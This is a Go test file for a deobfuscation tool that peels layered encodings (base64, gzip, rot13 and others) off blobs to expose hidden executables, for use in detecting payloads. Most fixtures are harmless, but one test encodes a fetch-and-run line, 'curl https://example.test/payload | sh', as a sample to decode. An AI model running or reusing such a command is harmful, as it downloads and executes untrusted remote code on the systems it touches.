package peeler

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"reflect"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// rendezvous is a layer that only returns once every layer sharing its barrier
// is inside Unwrap at the same moment, so it cannot pass if they run in turn.
type rendezvous struct {
	name    string
	barrier *sync.WaitGroup
}

func (r rendezvous) Name() string         { return r.name }
func (r rendezvous) Detect(b []byte) bool { return bytes.HasPrefix(b, []byte("start")) }
func (r rendezvous) Unwrap(b []byte, limit int64) ([]byte, error) {
	r.barrier.Done()
	done := make(chan struct{})
	go func() { r.barrier.Wait(); close(done) }()
	select {
	case <-done:
		return []byte("from " + r.name + strings.Repeat(".", 20)), nil
	case <-time.After(5 * time.Second):
		return nil, ErrNotThisLayer
	}
}

func TestDifferentLayersDecodeAtTheSameTime(t *testing.T) {
	var barrier sync.WaitGroup
	barrier.Add(3)
	layers := []Unwrapper{rendezvous{"a", &barrier}, rendezvous{"b", &barrier}, rendezvous{"c", &barrier}}
	r := New(WithUnwrappers(layers), WithParallelism(8)).Peel(context.Background(), []byte("start of the blob"))
	if r.NodesVisited != 4 {
		t.Fatalf("the layers did not all finish: %d nodes, %q", r.NodesVisited, r.ExhaustReason)
	}
}

// counting records how many decoders are running at once.
type counting struct {
	now, peak *atomic.Int64
	name      string
}

func (c counting) Name() string         { return c.name }
func (c counting) Detect(b []byte) bool { return true }
func (c counting) Unwrap(b []byte, limit int64) ([]byte, error) {
	n := c.now.Add(1)
	defer c.now.Add(-1)
	for {
		p := c.peak.Load()
		if n <= p || c.peak.CompareAndSwap(p, n) {
			break
		}
	}
	time.Sleep(time.Millisecond)
	return append([]byte(c.name), b...), nil
}

// Depth multiplies nothing: the limit is one pool across the whole tree.
func TestParallelismBoundsTheWholeTree(t *testing.T) {
	var now, peak atomic.Int64
	var layers []Unwrapper
	for i := 0; i < 8; i++ {
		layers = append(layers, counting{&now, &peak, fmt.Sprint("layer", i)})
	}
	p := New(WithUnwrappers(layers), WithParallelism(3),
		WithLimits(BudgetLimits{MaxNodes: 200, MaxDepth: 6, MaxChildren: 8}))
	if r := p.Peel(context.Background(), []byte("seed")); r.NodesVisited < 50 {
		t.Fatalf("the tree did not branch: %d nodes", r.NodesVisited)
	}
	if got := peak.Load(); got > 3 {
		t.Fatalf("%d decoders ran at once under a parallelism of 3", got)
	}
}

func TestParallelismOfOneIsSerial(t *testing.T) {
	var now, peak atomic.Int64
	layers := []Unwrapper{counting{&now, &peak, "a"}, counting{&now, &peak, "b"}, counting{&now, &peak, "c"}}
	New(WithUnwrappers(layers), WithParallelism(1), WithLimits(BudgetLimits{MaxNodes: 20, MaxDepth: 3})).
		Peel(context.Background(), []byte("seed"))
	if got := peak.Load(); got != 1 {
		t.Fatalf("%d decoders ran at once with parallelism 1", got)
	}
}

// Three payloads behind three different stacks, in one script.
func TestOneScriptOpensABranchPerPayload(t *testing.T) {
	first := encodeLayer("base64", encodeLayer("gzip", largeELF()))
	second := encodeAny("rot13", encodeLayer("base64", encodeLayer("zlib", largeELF()[8:])))
	third := encodeLayer("base64", encodeLayer("base64", []byte(strings.Repeat("#!/bin/sh\necho third\n", 20))))
	script := fmt.Sprintf("#!/bin/sh\nA=%q\nB=%q\nC=%q\n", first, second, third)

	r := peelDefault([]byte(script))
	for _, sig := range []string{"carve>base64>gzip", "carve>base64>base64"} {
		if !hasChain(r, sig) {
			t.Errorf("no chain %s in %v", sig, r.Chains)
		}
	}
	if r.Outcome != OutcomeRevealedExecutable {
		t.Fatalf("outcome = %s", r.Outcome)
	}
}

func TestDifferentLayersOpenDifferentBranches(t *testing.T) {
	layers := []Unwrapper{
		fixedLayer{"left", []byte("#!/bin/sh\necho left branch\n")},
		fixedLayer{"right", []byte("#!/bin/sh\necho right branch\n")},
	}
	r := New(WithUnwrappers(layers)).Peel(context.Background(), []byte("the same blob, twice"))
	if !hasChain(r, "left") || !hasChain(r, "right") {
		t.Fatalf("chains = %v", r.Chains)
	}
}

type fixedLayer struct {
	name string
	out  []byte
}

func (f fixedLayer) Name() string         { return f.name }
func (f fixedLayer) Detect(b []byte) bool { return !bytes.HasPrefix(b, []byte("#!")) }
func (f fixedLayer) Unwrap(b []byte, limit int64) ([]byte, error) {
	return f.out, nil
}

// Goroutines finish in any order. The report must not show it.
func TestResultsDoNotDependOnScheduling(t *testing.T) {
	first := encodeLayer("base64", encodeLayer("gzip", largeELF()))
	second := encodeLayer("hex", encodeLayer("zlib", largeELF()[8:]))
	blob := []byte(fmt.Sprintf("#!/bin/sh\nA=%q\nB=%q\n", first, second))

	strip := func(r Result) Result { r.RootEntropy = 0; return r }
	want := strip(peelDefault(blob))
	for i := 0; i < 200; i++ {
		if got := strip(peelDefault(blob)); !reflect.DeepEqual(got, want) {
			t.Fatalf("run %d differs:\n got %+v\nwant %+v", i, got, want)
		}
	}
}

// rot13 and rot18 agree on text with no digits. The label has to be settled by
// rank, not by whichever branch got to the shared cache first.
func TestColliderKeepsItsRankedLabel(t *testing.T) {
	script := []byte("#!/bin/sh\ncurl https://example.test/payload | sh\n")
	for i := 0; i < 100; i++ {
		r := peelDefault(caesar(script, 13))
		if !hasChain(r, "rot13") || len(r.Chains) != 1 {
			t.Fatalf("run %d: chains %v", i, r.Chains)
		}
	}
}

func TestPanickingDecoderLeavesItsSiblingsRunning(t *testing.T) {
	layers := []Unwrapper{alwaysPanics{}, fixedLayer{"survivor", []byte("#!/bin/sh\necho survivor\n")}}
	r := New(WithUnwrappers(layers), WithParallelism(4)).Peel(context.Background(), []byte("hostile input"))
	if !hasChain(r, "survivor") {
		t.Fatalf("a sibling's panic lost this branch: %v", r.Chains)
	}
	if !r.Exhausted {
		t.Fatal("the panic must still leave the peel marked incomplete")
	}
}

type alwaysPanics struct{}

func (alwaysPanics) Name() string                                 { return "panics" }
func (alwaysPanics) Detect(b []byte) bool                         { return true }
func (alwaysPanics) Unwrap(b []byte, limit int64) ([]byte, error) { panic("broken decoder") }

// Rank decides who gets the width, however the decoders finished.
func TestWidthGoesToTheHighestRanked(t *testing.T) {
	layers := []Unwrapper{
		fixedLayer{"first", []byte("#!/bin/sh\necho one\n")},
		fixedLayer{"second", []byte("#!/bin/sh\necho two\n")},
		fixedLayer{"third", []byte("#!/bin/sh\necho three\n")},
	}
	p := New(WithUnwrappers(layers), WithParallelism(4), WithLimits(BudgetLimits{MaxChildren: 2}))
	for i := 0; i < 50; i++ {
		r := p.Peel(context.Background(), []byte("a blob with three readings"))
		if !hasChain(r, "first") || !hasChain(r, "second") || hasChain(r, "third") {
			t.Fatalf("run %d: chains %v", i, r.Chains)
		}
		if !r.Exhausted || r.ExhaustReason != "frontier width" {
			t.Fatalf("a dropped branch must be reported, got %q", r.ExhaustReason)
		}
	}
}

func TestJobStreamsWhatPeelReturns(t *testing.T) {
	blob := composeAny(fakeELF, "base64", "rot13", "base64", "gzip")
	j := New().Start(context.Background(), blob)
	var layers, chains []Event
	for e := range j.Events() {
		switch e.Kind {
		case EventLayer:
			layers = append(layers, e)
		case EventChain:
			chains = append(chains, e)
		}
	}
	r := j.Wait()
	want := peelDefault(blob)
	if r.Outcome != want.Outcome || r.PrimarySignature != want.PrimarySignature || r.MaxDepth != want.MaxDepth {
		t.Fatalf("job %+v, peel %+v", r, want)
	}
	if len(chains) != len(r.Chains) || len(layers) < r.MaxDepth {
		t.Fatalf("%d layer and %d chain events for %+v", len(layers), len(chains), r)
	}
	if got := strings.Join(chains[0].Path, ">"); got != r.PrimarySignature {
		t.Fatalf("chain event %q, verdict %q", got, r.PrimarySignature)
	}
}

func TestLayerEventsArriveBeforeTheVerdict(t *testing.T) {
	gate := make(chan struct{})
	release := sync.OnceFunc(func() { close(gate) })
	defer release()
	layers := []Unwrapper{
		fixedLayer{"seen", []byte("next stage of the blob")},
		gatedLayer{gate},
	}
	j := New(WithUnwrappers(layers), WithParallelism(4)).Start(context.Background(), []byte("blob for the first node"))
	select {
	case e := <-j.Events():
		if e.Kind != EventLayer {
			t.Fatalf("event = %+v", e)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("nothing was reported while the peel was still running")
	}
	select {
	case <-j.done:
		t.Fatal("the peel should still be waiting on its gated layer")
	default:
	}
	release()
	j.Wait()
}

// gatedLayer holds the second-level decode open, so the test can observe a peel
// that has reported something and is not finished.
type gatedLayer struct{ gate chan struct{} }

func (gatedLayer) Name() string { return "gated" }
func (g gatedLayer) Detect(b []byte) bool {
	return bytes.HasPrefix(b, []byte("next"))
}
func (g gatedLayer) Unwrap(b []byte, limit int64) ([]byte, error) {
	<-g.gate
	return nil, ErrNotThisLayer
}

func TestUnreadJobStillFinishes(t *testing.T) {
	j := New().Start(context.Background(), composeAny(fakeELF, "base64", "base64", "gzip"))
	done := make(chan Result, 1)
	go func() { done <- j.Wait() }()
	select {
	case r := <-done:
		if r.Outcome != OutcomeRevealedExecutable {
			t.Fatalf("outcome = %s", r.Outcome)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("a job nobody reads blocked on its events")
	}
}

func TestJobStopsWhenCancelled(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	j := New().Start(ctx, []byte(base64.StdEncoding.EncodeToString(bytes.Repeat([]byte("x"), 4096))))
	if r := j.Wait(); !r.Exhausted {
		t.Fatalf("a cancelled peel reported %+v", r)
	}
}

func TestManyJobsTogether(t *testing.T) {
	blob := composeAny(fakeELF, "base85", "rot47", "base64", "gzip")
	jobs := make([]*Job, 64)
	for i := range jobs {
		jobs[i] = New().Start(context.Background(), blob)
	}
	for i, j := range jobs {
		if r := j.Wait(); !hasChain(r, "base85>rot47>base64>gzip") {
			t.Fatalf("job %d: %v", i, r.Chains)
		}
	}
}

func BenchmarkPeelProse(b *testing.B) {
	data := []byte(strings.Repeat("Ordinary documentation with nothing hidden in it.\n", 80))
	p := New()
	b.SetBytes(int64(len(data)))
	for b.Loop() {
		p.Peel(context.Background(), data)
	}
}

func BenchmarkPeelChain(b *testing.B) {
	data := composeAny(largeELF(), "base85", "rot13", "base64", "gzip")
	p := New()
	b.SetBytes(int64(len(data)))
	for b.Loop() {
		p.Peel(context.Background(), data)
	}
}

func BenchmarkPeelBinary(b *testing.B) {
	data := largeELF()
	data = append(bytes.Repeat(data[8:], 40), data...) // no recognised header
	p := New()
	b.SetBytes(int64(len(data)))
	for b.Loop() {
		p.Peel(context.Background(), data)
	}
}
